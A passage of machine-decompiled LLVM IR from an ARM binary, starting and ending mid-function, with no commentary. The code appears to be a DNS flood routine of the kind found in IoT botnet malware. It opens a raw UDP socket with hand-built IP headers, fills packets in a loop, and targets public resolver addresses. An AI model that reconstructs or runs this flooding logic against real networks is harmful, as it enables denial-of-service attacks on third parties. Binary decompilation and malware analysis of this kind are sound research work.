  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_de08 ], [ 104859200, %dec_label_pc_ddf8 ], [ 707416650, %dec_label_pc_ddec ], [ 134744072, %dec_label_pc_ddd8 ], [ %v3_d8c8, %dec_label_pc_d8a4 ]
  store i32 %v5_d794, i32* %ip.global-to-local, align 4
  %v2_d8d4 = icmp eq i32 %v5_d794, 0
  store i1 %v2_d8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d8d4, label %dec_label_pc_ddcc, label %dec_label_pc_d8dc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8d0
  store i32 %v5_d794, i32* %r0.global-to-local, align 4
  %v1_d8e0 = inttoptr i32 %v5_d794 to i8*
  %v2_d8e0 = call i32 @function_119dc(i8* %v1_d8e0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d8f4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_d8f4, i32* %r0.global-to-local, align 4
  %v2_d8f8 = icmp eq i32 %v3_d8f4, -1
  store i1 %v2_d8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d8f8, label %dec_label_pc_ddcc, label %dec_label_pc_d904

dec_label_pc_d904:                                ; preds = %dec_label_pc_d8dc
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d910 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d910, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_d924 = call i32 @setsockopt(i32 %v3_d8f4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_d924, i32* %r0.global-to-local, align 4
  %v2_d928 = icmp eq i32 %v7_d924, -1
  store i1 %v2_d928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d928, label %dec_label_pc_ddc4, label %dec_label_pc_d930

dec_label_pc_d930:                                ; preds = %dec_label_pc_d904
  store i32 %v1_d680, i32* %r0.global-to-local, align 4
  %v3_d938 = mul i32 %v7_d6d4, 65536
  store i32 %v3_d938, i32* %lr.global-to-local, align 4
  %v0_d93c = load i32, i32* @sl, align 4
  %v3_d93c = mul i32 %v0_d93c, 65536
  store i32 %v3_d93c, i32* %sl.global-to-local, align 4
  %v0_d940 = load i32, i32* %r8.global-to-local, align 4
  %v0_d944 = load i32, i32* %fp.global-to-local, align 4
  %v3_d944 = mul i32 %v0_d944, 65536
  store i32 %v3_d944, i32* %r5.global-to-local, align 4
  %v0_d948 = load i32, i32* %sb.global-to-local, align 4
  %v3_d948 = mul i32 %v0_d948, 65536
  store i32 %v3_d948, i32* %sb.global-to-local, align 4
  %v5_d94c = trunc i32 %v0_d940 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d954 = urem i32 %v7_d6d4, 65536
  store i32 %v3_d954, i32* %r2.global-to-local, align 4
  %v3_d958 = urem i32 %v0_d944, 65536
  store i32 %v3_d958, i32* %r3.global-to-local, align 4
  %v3_d95c = urem i32 %v0_d948, 65536
  store i32 %v3_d95c, i32* %r4.global-to-local, align 4
  %v3_d960 = urem i32 %v0_d93c, 65536
  store i32 %v3_d960, i32* %r8.global-to-local, align 4
  %v2_d964 = icmp eq i32 %v1_d680, 0
  store i1 %v2_d964, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_d964, label %dec_label_pc_ddb4, label %dec_label_pc_d988

dec_label_pc_d988:                                ; preds = %dec_label_pc_d930
  %v4_d98c = sext i8 %v5_d94c to i32
  %v2_d990 = add i32 %v4_d98c, %v2_d8e0
  store i32 %v2_d990, i32* @fp, align 4
  %v3_d994 = mul i32 %v2_d990, 65536
  %v1_d998 = add i32 %v3_d994, 1769472
  store i32 %v1_d998, i32* %r6.global-to-local, align 4
  %v1_d99c = add i32 %v3_d994, 3080192
  %v1_d9b0 = urem i32 %v0_d93c, 256
  %v3_d9c0 = udiv i32 %v1_d998, 256
  %v1_d9c4 = urem i32 %v7_d6d4, 256
  %v1_d9c8 = and i32 %v3_d9c0, 65280
  %v1_d9cc = urem i32 %v0_d948, 256
  %v3_d9d0 = mul nuw nsw i32 %v1_d9b0, 256
  %v1_d9d8 = urem i32 %v0_d944, 256
  %v3_d9dc = mul nuw nsw i32 %v1_d9cc, 256
  %tmp141 = udiv i32 %v0_d93c, 256
  %v4_d9e0 = urem i32 %tmp141, 256
  %v5_d9e0 = or i32 %v4_d9e0, %v3_d9d0
  store i32 %v5_d9e0, i32* %r8.global-to-local, align 4
  %v4_d9e4 = udiv i32 %v1_d998, 16777216
  %v5_d9e4 = or i32 %v1_d9c8, %v4_d9e4
  store i32 %v5_d9e4, i32* %sl.global-to-local, align 4
  %tmp142 = udiv i32 %v0_d944, 256
  %v3_d9f0 = urem i32 %tmp142, 256
  %v4_d9f4 = sdiv i32 %v1_d99c, 16777216
  %tmp143 = udiv i32 %v7_d6d4, 256
  %v4_d9fc = mul nuw nsw i32 %v1_d9d8, 256
  %v5_d9fc = or i32 %v4_d9fc, %v3_d9f0
  store i32 %v5_d9fc, i32* %r5.global-to-local, align 4
  %tmp144 = udiv i32 %v0_d948, 256
  %v4_da00 = urem i32 %tmp144, 256
  %v5_da00 = or i32 %v4_da00, %v3_d9dc
  store i32 %v5_da00, i32* %sb.global-to-local, align 4
  store i32 %v1_d9c4, i32* %r0.global-to-local, align 4
  %v1_da0c = add i32 %v2_d8e0, 1
  store i32 %v1_da0c, i32* %r7.global-to-local, align 4
  %v3_da10 = ashr i32 %v1_d99c, 31
  store i32 %v3_da10, i32* %lr.global-to-local, align 4
  store i32 %v1_d9d8, i32* %r1.global-to-local, align 4
  store i32 %v1_d9cc, i32* %r2.global-to-local, align 4
  %v3_da1c76 = udiv i32 %v1_d9c8, 256
  store i32 %v3_da1c76, i32* %r3.global-to-local, align 4
  store i32 %v1_d9b0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %sext14 = mul i32 %tmp143, 16777216
  %v4_daac = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v7_d6d4, 16777216
  %v4_dab0 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_d998, 256
  %v4_dae0 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_d948, 16777216
  %v4_dae4 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_d944, 16777216
  %v4_db08 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_d93c, 16777216
  %v4_db14 = sdiv i32 %sext19, 16777216
  %v1_da90 = trunc i32 %v4_d9f4 to i8
  %extract.t = trunc i32 %v3_da10 to i8
  br label %dec_label_pc_da40

dec_label_pc_da40:                                ; preds = %dec_label_pc_dba8, %dec_label_pc_d988
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_da48 = call i32* @calloc(i32 600, i32 1)
  %v4_da48 = ptrtoint i32* %v2_da48 to i32
  store i32 %v4_da48, i32* %r0.global-to-local, align 4
  store i32 %v4_d698, i32* %lr.global-to-local, align 4
  %v3_da50 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da50, i32* %r3.global-to-local, align 4
  %v2_da54 = load i32, i32* %r4.global-to-local, align 4
  %v5_da54 = mul i32 %v2_da54, 4
  %v6_da54 = add i32 %v5_da54, %v4_d698
  %v7_da54 = inttoptr i32 %v6_da54 to i32*
  store i32 %v4_da48, i32* %v7_da54, align 4
  %v0_da58 = load i32, i32* %lr.global-to-local, align 4
  %v1_da58 = load i32, i32* %r3.global-to-local, align 4
  %v4_da58 = mul i32 %v1_da58, 4
  %v5_da58 = add i32 %v4_da58, %v0_da58
  %v6_da58 = inttoptr i32 %v5_da58 to i32*
  %v7_da58 = load i32, i32* %v6_da58, align 4
  store i32 %v7_da58, i32* %r1.global-to-local, align 4
  %v1_da5c = inttoptr i32 %v7_da58 to i8*
  %v2_da5c = load i8, i8* %v1_da5c, align 1
  %tmp156 = urem i8 %v2_da5c, 16
  %v1_da60 = zext i8 %tmp156 to i32
  %v1_da64 = or i32 %v1_da60, 64
  store i32 %v1_da64, i32* %r2.global-to-local, align 4
  %v1_da68 = trunc i32 %v1_da64 to i8
  store i8 %v1_da68, i8* %v1_da5c, align 1
  %v0_da6c = load i32, i32* %r1.global-to-local, align 4
  %v1_da6c = inttoptr i32 %v0_da6c to i8*
  %v2_da6c = load i8, i8* %v1_da6c, align 1
  %v1_da70 = and i8 %v2_da6c, -16
  %v1_da74 = or i8 %v1_da70, 5
  store i32 %v1_d718, i32* %r0.global-to-local, align 4
  store i8 %v1_da74, i8* %v1_da6c, align 1
  store i32 %v6_d6b0, i32* %r2.global-to-local, align 4
  %v2_da84 = load i32, i32* %r1.global-to-local, align 4
  %v3_da84 = add i32 %v2_da84, 1
  %v4_da84 = inttoptr i32 %v3_da84 to i8*
  store i8 %v5_d6d0, i8* %v4_da84, align 1
  store i32 %v4_d9f4, i32* %r3.global-to-local, align 4
  %v0_da8c = load i32, i32* %r0.global-to-local, align 4
  %v2_da8c = icmp eq i32 %v0_da8c, 0
  store i1 %v2_da8c, i1* %cpsr_z.global-to-local, align 1
  %v2_da90 = load i32, i32* %r1.global-to-local, align 4
  %v3_da90 = add i32 %v2_da90, 2
  %v4_da90 = inttoptr i32 %v3_da90 to i8*
  store i8 %v1_da90, i8* %v4_da90, align 1
  store i32 %v3_da10, i32* %r4.global-to-local, align 4
  store i32 %v5_d70c, i32* %r0.global-to-local, align 4
  %v0_da9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da9c, label %.thread21, label %bb145

bb145:                                            ; preds = %dec_label_pc_da40
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_daa0 = load i32, i32* %r1.global-to-local, align 4
  %v4_daa0 = add i32 %v3_daa0, 6
  %v5_daa0 = inttoptr i32 %v4_daa0 to i8*
  store i8 64, i8* %v5_daa0, align 1
  %v0_daa8.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t77 = trunc i32 %v0_daa8.pre to i8
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_da40, %bb145
  %v0_daa8.off0 = phi i8 [ %extract.t, %dec_label_pc_da40 ], [ %extract.t77, %bb145 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_daa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_daa8 = add i32 %v2_daa8, 3
  %v4_daa8 = inttoptr i32 %v3_daa8 to i8*
  store i8 %v0_daa8.off0, i8* %v4_daa8, align 1
  store i32 %v4_daac, i32* %ip.global-to-local, align 4
  store i32 %v4_dab0, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a714.104 to i32), i32* %r4.global-to-local, align 4
  %v0_dab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dab8 = trunc i32 %v0_dab8 to i8
  %v2_dab8 = load i32, i32* %r1.global-to-local, align 4
  %v3_dab8 = add i32 %v2_dab8, 8
  %v4_dab8 = inttoptr i32 %v3_dab8 to i8*
  store i8 %v1_dab8, i8* %v4_dab8, align 1
  %v0_dabc = load i32, i32* %r3.global-to-local, align 4
  %v1_dabc = trunc i32 %v0_dabc to i8
  %v2_dabc = load i32, i32* %r1.global-to-local, align 4
  %v3_dabc = add i32 %v2_dabc, 9
  %v4_dabc = inttoptr i32 %v3_dabc to i8*
  store i8 %v1_dabc, i8* %v4_dabc, align 1
  %v0_dac0 = load i32, i32* %lr.global-to-local, align 4
  %v1_dac0 = trunc i32 %v0_dac0 to i8
  %v2_dac0 = load i32, i32* %r1.global-to-local, align 4
  %v3_dac0 = add i32 %v2_dac0, 5
  %v4_dac0 = inttoptr i32 %v3_dac0 to i8*
  store i8 %v1_dac0, i8* %v4_dac0, align 1
  %v0_dac4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dac4, label %.thread22, label %bb146

.thread22:                                        ; preds = %.thread21
  %v2_dac823 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_dac823, i32* %r3.global-to-local, align 4
  store i32 %v4_d98c, i32* %lr.global-to-local, align 4
  br label %bb147

bb146:                                            ; preds = %.thread21
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dac8 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_dac8, i32* %r3.global-to-local, align 4
  store i32 %v4_d98c, i32* %lr.global-to-local, align 4
  %v3_dad0 = load i32, i32* %r1.global-to-local, align 4
  %v4_dad0 = add i32 %v3_dad0, 7
  %v5_dad0 = inttoptr i32 %v4_dad0 to i8*
  store i8 0, i8* %v5_dad0, align 1
  %v0_dad8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_dadc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %.thread22, %bb146
  %v0_dadc = phi i32 [ %v2_dac823, %.thread22 ], [ %v0_dadc.pre, %bb146 ]
  %v0_dad8 = phi i32 [ %v4_d98c, %.thread22 ], [ %v0_dad8.pre, %bb146 ]
  %v0_dad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad8, 41
  %v2_dad8 = add i32 %v1_dad4, %v0_dad4
  store i32 %v2_dad8, i32* %r4.global-to-local, align 4
  %v2_dadc = add i32 %v0_dad4, 12
  %v3_dadc = inttoptr i32 %v2_dadc to i32*
  store i32 %v0_dadc, i32* %v3_dadc, align 4
  store i32 %v4_dae0, i32* %r2.global-to-local, align 4
  store i32 %v4_dae4, i32* %r3.global-to-local, align 4
  %v0_dae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_dae8 = add i32 %v0_dae8, 20
  store i32 %v1_dae8, i32* %r0.global-to-local, align 4
  %v0_daec = load i32, i32* %ip.global-to-local, align 4
  %v1_daec = trunc i32 %v0_daec to i8
  %v3_daec = add i32 %v0_dae8, 4
  %v4_daec = inttoptr i32 %v3_daec to i8*
  store i8 %v1_daec, i8* %v4_daec, align 1
  %v0_daf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_daf0 = trunc i32 %v0_daf0 to i8
  %v2_daf0 = load i32, i32* %r0.global-to-local, align 4
  %v3_daf0 = add i32 %v2_daf0, 5
  %v4_daf0 = inttoptr i32 %v3_daf0 to i8*
  store i8 %v1_daf0, i8* %v4_daf0, align 1
  %v0_daf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_daf4 = trunc i32 %v0_daf4 to i8
  %v2_daf4 = load i32, i32* %r0.global-to-local, align 4
  %v3_daf4 = add i32 %v2_daf4, 3
  %v4_daf4 = inttoptr i32 %v3_daf4 to i8*
  store i8 %v1_daf4, i8* %v4_daf4, align 1
  %v0_daf8 = load i32, i32* %sb.global-to-local, align 4
  %v1_daf8 = trunc i32 %v0_daf8 to i8
  %v2_daf8 = load i32, i32* %r0.global-to-local, align 4
  %v3_daf8 = add i32 %v2_daf8, 2
  %v4_daf8 = inttoptr i32 %v3_daf8 to i8*
  store i8 %v1_daf8, i8* %v4_daf8, align 1
  %v0_dafc = load i32, i32* %sl.global-to-local, align 4
  %v1_dafc = trunc i32 %v0_dafc to i8
  %v2_dafc = load i32, i32* %r0.global-to-local, align 4
  %v3_dafc = add i32 %v2_dafc, 4
  %v4_dafc = inttoptr i32 %v3_dafc to i8*
  store i8 %v1_dafc, i8* %v4_dafc, align 1
  %v0_db00 = load i32, i32* %r5.global-to-local, align 4
  %v1_db00 = trunc i32 %v0_db00 to i8
  %v2_db00 = load i32, i32* %r1.global-to-local, align 4
  %v3_db00 = add i32 %v2_db00, 20
  %v4_db00 = inttoptr i32 %v3_db00 to i8*
  store i8 %v1_db00, i8* %v4_db00, align 1
  store i32 %v4_db08, i32* %r2.global-to-local, align 4
  %v1_db0c = load i32, i32* %r1.global-to-local, align 4
  %v2_db0c = add i32 %v1_db0c, 16
  %v3_db0c = inttoptr i32 %v2_db0c to i32*
  store i32 %stack_var_-2176.0, i32* %v3_db0c, align 4
  %v0_db10 = load i32, i32* %r2.global-to-local, align 4
  %v1_db10 = trunc i32 %v0_db10 to i8
  %v2_db10 = load i32, i32* %r0.global-to-local, align 4
  %v3_db10 = add i32 %v2_db10, 1
  %v4_db10 = inttoptr i32 %v3_db10 to i8*
  store i8 %v1_db10, i8* %v4_db10, align 1
  store i32 %v4_db14, i32* %lr.global-to-local, align 4
  store i32 %v4_d98c, i32* %r0.global-to-local, align 4
  %v0_db1c = load i32, i32* %r1.global-to-local, align 4
  %v1_db1c = add i32 %v0_db1c, 28
  store i32 %v1_db1c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_db28 = load i32, i32* %r8.global-to-local, align 4
  %v1_db28 = trunc i32 %v0_db28 to i8
  %v4_db28 = inttoptr i32 %v1_db1c to i8*
  store i8 %v1_db28, i8* %v4_db28, align 1
  %v0_db2c = load i32, i32* %r3.global-to-local, align 4
  %v1_db2c = trunc i32 %v0_db2c to i8
  %v2_db2c = load i32, i32* %ip.global-to-local, align 4
  %v3_db2c = add i32 %v2_db2c, 5
  %v4_db2c = inttoptr i32 %v3_db2c to i8*
  store i8 %v1_db2c, i8* %v4_db2c, align 1
  %v0_db30 = load i32, i32* %lr.global-to-local, align 4
  %v1_db30 = trunc i32 %v0_db30 to i8
  %v2_db30 = load i32, i32* %ip.global-to-local, align 4
  %v3_db30 = add i32 %v2_db30, 1
  %v4_db30 = inttoptr i32 %v3_db30 to i8*
  store i8 %v1_db30, i8* %v4_db30, align 1
  %v0_db34 = load i32, i32* %r3.global-to-local, align 4
  %v1_db34 = trunc i32 %v0_db34 to i8
  %v2_db34 = load i32, i32* %ip.global-to-local, align 4
  %v3_db34 = add i32 %v2_db34, 2
  %v4_db34 = inttoptr i32 %v3_db34 to i8*
  store i8 %v1_db34, i8* %v4_db34, align 1
  %v0_db38 = load i32, i32* %r6.global-to-local, align 4
  %v1_db38 = trunc i32 %v0_db38 to i8
  %v2_db38 = load i32, i32* %ip.global-to-local, align 4
  %v3_db38 = add i32 %v2_db38, 3
  %v4_db38 = inttoptr i32 %v3_db38 to i8*
  store i8 %v1_db38, i8* %v4_db38, align 1
  %v0_db3c = load i32, i32* %r6.global-to-local, align 4
  %v1_db3c = trunc i32 %v0_db3c to i8
  %v2_db3c = load i32, i32* %ip.global-to-local, align 4
  %v3_db3c = add i32 %v2_db3c, 4
  %v4_db3c = inttoptr i32 %v3_db3c to i8*
  store i8 %v1_db3c, i8* %v4_db3c, align 1
  %v0_db40 = load i32, i32* %r0.global-to-local, align 4
  %v1_db40 = trunc i32 %v0_db40 to i8
  %v2_db40 = load i32, i32* %r1.global-to-local, align 4
  %v3_db40 = add i32 %v2_db40, 40
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v1_db40, i8* %v4_db40, align 1
  store i32 %v5_d794, i32* %r1.global-to-local, align 4
  %v0_db48 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_db48, i32* %r2.global-to-local, align 4
  %v0_db4c = load i32, i32* %r4.global-to-local, align 4
  %v1_db4c = add i32 %v0_db4c, 1
  store i32 %v1_db4c, i32* %r0.global-to-local, align 4
  %v3_db50 = call i32 @function_11a58(i32 %v1_db4c, i32 %v5_d794, i32 %v0_db48)
  store i32 %v3_db50, i32* %r0.global-to-local, align 4
  store i32 %v2_d8e0, i32* %r1.global-to-local, align 4
  %v1_db58 = load i32, i32* %r6.global-to-local, align 4
  %v9_db58 = icmp eq i32 %v2_d8e0, %v1_db58
  store i1 %v9_db58, i1* %cpsr_z.global-to-local, align 1
  %v7_db5c = icmp sgt i32 %v2_d8e0, %v1_db58
  store i32 %v1_db58, i32* %lr.global-to-local, align 4
  %v0_db6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_db6c, i32* %r2.global-to-local, align 4
  %extract.t79 = trunc i32 %v1_db58 to i8
  br i1 %v7_db5c, label %dec_label_pc_db68, label %dec_label_pc_dba8

dec_label_pc_db68:                                ; preds = %bb147
  store i32 %v1_db58, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_db74

dec_label_pc_db74:                                ; preds = %bb150, %dec_label_pc_db68
  %v0_db9086153 = phi i32 [ %v0_db9086154, %bb150 ], [ %v1_db58, %dec_label_pc_db68 ]
  %v1_db8433 = phi i32 [ %v1_db9492, %bb150 ], [ %v1_db58, %dec_label_pc_db68 ]
  %v1_db80.off0 = phi i8 [ %v1_db8057.off0, %bb150 ], [ %extract.t79, %dec_label_pc_db68 ]
  %v0_db8432 = phi i32 [ %v0_db84325589, %bb150 ], [ %v0_db6c, %dec_label_pc_db68 ]
  store i32 %v5_d794, i32* %ip.global-to-local, align 4
  %v2_db78 = add i32 %v1_db8433, %v5_d794
  %v3_db78 = inttoptr i32 %v2_db78 to i8*
  %v4_db78 = load i8, i8* %v3_db78, align 1
  %v6_db78 = zext i8 %v4_db78 to i32
  store i32 %v6_db78, i32* %r3.global-to-local, align 4
  %v7_db7c = icmp eq i8 %v4_db78, 46
  store i1 %v7_db7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db7c, label %bb148, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_db74
  %v2_db8434 = add i32 %v1_db8433, %v0_db8432
  store i32 %v2_db8434, i32* %r0.global-to-local, align 4
  br label %.thread35

bb148:                                            ; preds = %dec_label_pc_db74
  %v3_db80 = load i32, i32* %r2.global-to-local, align 4
  %v4_db80 = inttoptr i32 %v3_db80 to i8*
  store i8 %v1_db80.off0, i8* %v4_db80, align 1
  %v0_db88.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_db84 = load i32, i32* %r4.global-to-local, align 4
  %v1_db84 = load i32, i32* %r1.global-to-local, align 4
  %v2_db84 = add i32 %v1_db84, %v0_db84
  store i32 %v2_db84, i32* %r0.global-to-local, align 4
  br i1 %v0_db88.pr, label %bb149, label %bb148..thread35_crit_edge

bb148..thread35_crit_edge:                        ; preds = %bb148
  %v0_db9086.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread35

bb149:                                            ; preds = %bb148
  %v2_db88 = add i32 %v2_db84, 1
  store i32 %v2_db88, i32* %r2.global-to-local, align 4
  store i32 %v2_d8e0, i32* %r0.global-to-local, align 4
  %v0_db90 = load i32, i32* %lr.global-to-local, align 4
  %v1_db90 = add i32 %v0_db90, 1
  store i32 %v1_db90, i32* %ip.global-to-local, align 4
  %v1_db94 = add i32 %v1_db84, 1
  store i32 %v1_db94, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb150

.thread35:                                        ; preds = %bb148..thread35_crit_edge, %.thread31
  %v0_db9086 = phi i32 [ %v0_db9086.pre, %bb148..thread35_crit_edge ], [ %v0_db9086153, %.thread31 ]
  %v0_db94.ph = phi i32 [ %v1_db84, %bb148..thread35_crit_edge ], [ %v1_db8433, %.thread31 ]
  %v0_db843255.ph = phi i32 [ %v0_db84, %bb148..thread35_crit_edge ], [ %v0_db8432, %.thread31 ]
  store i32 %v2_d8e0, i32* %r0.global-to-local, align 4
  %v1_db9087 = add i32 %v0_db9086, 1
  store i32 %v1_db9087, i32* %ip.global-to-local, align 4
  %v1_db9488 = add i32 %v0_db94.ph, 1
  store i32 %v1_db9488, i32* %r1.global-to-local, align 4
  %v2_db9c = urem i32 %v1_db9087, 256
  store i32 %v2_db9c, i32* %lr.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_db9087 to i8
  br label %bb150

bb150:                                            ; preds = %bb149, %.thread35
  %v0_db9086154 = phi i32 [ 0, %bb149 ], [ %v2_db9c, %.thread35 ]
  %v1_db9492 = phi i32 [ %v1_db94, %bb149 ], [ %v1_db9488, %.thread35 ]
  %v0_db84325589 = phi i32 [ %v0_db84, %bb149 ], [ %v0_db843255.ph, %.thread35 ]
  %v1_db8057.off0 = phi i8 [ 0, %bb149 ], [ %extract.t82, %.thread35 ]
  %v9_dba0 = icmp eq i32 %v2_d8e0, %v1_db9492
  store i1 %v9_dba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dba0, label %dec_label_pc_dba8.loopexit, label %dec_label_pc_db74

dec_label_pc_dba8.loopexit:                       ; preds = %bb150
  %v2_dba8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dba8

dec_label_pc_dba8:                                ; preds = %dec_label_pc_dba8.loopexit, %bb147
  %v2_dba8 = phi i32 [ %v2_dba8.pre, %dec_label_pc_dba8.loopexit ], [ %v0_db6c, %bb147 ]
  %v0_dba8.off0 = phi i8 [ %v1_db8057.off0, %dec_label_pc_dba8.loopexit ], [ %extract.t79, %bb147 ]
  %v3_dba8 = inttoptr i32 %v2_dba8 to i8*
  store i8 %v0_dba8.off0, i8* %v3_dba8, align 1
  %v3_dbac = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_d8e0, i32* %r1.global-to-local, align 4
  %v0_dbb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_dbb4 = add i32 %v0_dbb4, %v2_d8e0
  store i32 %v2_dbb4, i32* %r3.global-to-local, align 4
  %v1_dbb8 = add i32 %v3_dbac, 1
  store i32 %v1_dbb8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %lr.global-to-local, align 4
  %v9_dbc8 = icmp eq i32 %v1_d680, %v1_dbb8
  store i1 %v9_dbc8, i1* %cpsr_z.global-to-local, align 1
  %v1_dbcc = add i32 %v2_dbb4, 2
  store i32 %v1_dbcc, i32* %r2.global-to-local, align 4
  %v4_dbd0 = inttoptr i32 %v1_dbcc to i8*
  store i8 0, i8* %v4_dbd0, align 1
  %v0_dbd4 = load i32, i32* %lr.global-to-local, align 4
  %v1_dbd4 = trunc i32 %v0_dbd4 to i8
  %v2_dbd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_dbd4 = add i32 %v2_dbd4, 3
  %v4_dbd4 = inttoptr i32 %v3_dbd4 to i8*
  store i8 %v1_dbd4, i8* %v4_dbd4, align 1
  %v0_dbd8 = load i32, i32* %lr.global-to-local, align 4
  %v1_dbd8 = trunc i32 %v0_dbd8 to i8
  %v2_dbd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_dbd8 = add i32 %v2_dbd8, 1
  %v4_dbd8 = inttoptr i32 %v3_dbd8 to i8*
  store i8 %v1_dbd8, i8* %v4_dbd8, align 1
  %v0_dbdc = load i32, i32* %ip.global-to-local, align 4
  %v1_dbdc = trunc i32 %v0_dbdc to i8
  %v2_dbdc = load i32, i32* %r2.global-to-local, align 4
  %v3_dbdc = add i32 %v2_dbdc, 2
  %v4_dbdc = inttoptr i32 %v3_dbdc to i8*
  store i8 %v1_dbdc, i8* %v4_dbdc, align 1
  %v0_dbe0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_dbe0, i32* %stack_var_-40, align 4
  %v8_dbe4 = icmp sgt i32 %v1_d680, %v1_dbb8
  br i1 %v8_dbe4, label %dec_label_pc_da40, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dba8, %dec_label_pc_ddb4
  %v4_dc58.pre-phi = phi i32 [ %v4_ddb8, %dec_label_pc_ddb4 ], [ %v4_d98c, %dec_label_pc_dba8 ]
  store i32 %v1_d680, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_d964, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbf4, %dec_label_pc_dd18, %dec_label_pc_dbe8
  br i1 %v2_d964, label %dec_label_pc_dbf4, label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %dec_label_pc_dbf4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_dc08 = load i32, i32* @fp, align 4
  %v1_dc08 = add i32 %v0_dc08, 27
  store i32 %v1_dc08, i32* @sb, align 4
  %v1_dc0c = add i32 %v0_dc08, 47
  store i32 %v1_dc0c, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_dc14

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dc54.dec_label_pc_dc14_crit_edge, %dec_label_pc_dbf8
  %v1_dc34 = phi i32 [ %v1_dc20.pre, %dec_label_pc_dc54.dec_label_pc_dc14_crit_edge ], [ 65535, %dec_label_pc_dbf8 ]
  %v1_dc1c = phi i32 [ %v1_dd04, %dec_label_pc_dc54.dec_label_pc_dc14_crit_edge ], [ 0, %dec_label_pc_dbf8 ]
  store i32 %v4_d698, i32* %r3.global-to-local, align 4
  store i32 %v3_d954, i32* %r8.global-to-local, align 4
  %v4_dc1c = mul i32 %v1_dc1c, 4
  %v5_dc1c = add i32 %v4_dc1c, %v4_d698
  %v6_dc1c = inttoptr i32 %v5_dc1c to i32*
  %v7_dc1c = load i32, i32* %v6_dc1c, align 4
  store i32 %v7_dc1c, i32* @r4, align 4
  %v9_dc20 = icmp eq i32 %v3_d954, %v1_dc34
  store i1 %v9_dc20, i1* %cpsr_z.global-to-local, align 1
  %v1_dc24 = add i32 %v7_dc1c, 20
  store i32 %v1_dc24, i32* @r5, align 4
  %v1_dc28 = add i32 %v7_dc1c, 28
  store i32 %v1_dc28, i32* @r8, align 4
  br i1 %v9_dc20, label %dec_label_pc_dd28, label %dec_label_pc_dc30

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc14
  store i32 %v3_d958, i32* %ip.global-to-local, align 4
